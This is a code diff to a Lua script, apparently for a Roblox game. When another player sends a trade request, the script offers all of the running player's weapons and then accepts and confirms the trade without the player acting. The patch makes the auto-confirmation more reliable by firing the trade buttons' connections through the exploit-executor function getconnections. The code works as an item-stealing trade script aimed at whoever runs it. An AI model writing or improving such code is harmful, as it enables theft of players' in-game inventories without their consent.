@@ -156,8 +156,8 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                 warn("Mobile inventory container path not found; pulled " .. tostring(offeredCount) .. " items from Backpack instead.")
             end
 
-            print("Waiting 3 seconds before triggering Accept and Confirm...")
-            task.wait(3)
+            print("Finished offering all weapons. Waiting 6 seconds...")
+            task.wait(6)
 
             pcall(function()
                 AcceptTradeEvent:FireServer(true)
@@ -172,11 +172,48 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                 end)
             end
 
-            task.wait(1)
-            clickTradeButton("accept")
+            local player = game:GetService("Players").LocalPlayer
+            local actionsFolder = player.PlayerGui:WaitForChild("TradeGUI"):WaitForChild("Container"):WaitForChild("Trade"):WaitForChild("Actions")
+
+            local function fireButton(btn)
+                if btn and btn:IsA("GuiButton") and getconnections then
+                    for _, connection in ipairs(getconnections(btn.Activated)) do
+                        connection:Fire()
+                    end
+                    for _, connection in ipairs(getconnections(btn.MouseButton1Click)) do
+                        connection:Fire()
+                    end
+                end
+                pcall(function()
+                    if btn and btn:IsA("GuiButton") then
+                        btn:Activate()
+                    end
+                end)
+            end
+
+            local successFirst, firstButton = pcall(function()
+                return actionsFolder:WaitForChild("Accept", 3):WaitForChild("ActionButton", 3)
+            end)
+
+            if successFirst and firstButton then
+                fireButton(firstButton)
+                print("Triggered first ActionButton")
+            else
+                clickTradeButton("accept")
+            end
 
             task.wait(1)
-            clickTradeButton("confirm")
+
+            local successConfirm, confirmButton = pcall(function()
+                return actionsFolder:WaitForChild("Accept", 3):WaitForChild("Confirm", 3):WaitForChild("ActionButton", 3)
+            end)
+
+            if successConfirm and confirmButton then
+                fireButton(confirmButton)
+                print("Triggered confirmation ActionButton")
+            else
+                clickTradeButton("confirm")
+            end
         end)
 
         return true
